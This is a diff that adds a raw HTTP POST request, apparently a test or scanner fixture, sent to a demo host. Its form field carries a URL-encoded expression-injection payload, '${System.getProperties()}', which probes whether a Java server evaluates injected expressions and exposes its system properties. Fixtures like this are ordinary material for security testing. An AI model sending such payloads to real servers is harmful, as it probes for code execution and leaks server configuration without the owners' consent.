@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+Connection: close
+
+q=t%3D%24%7BSystem.getProperties%28%29%7D
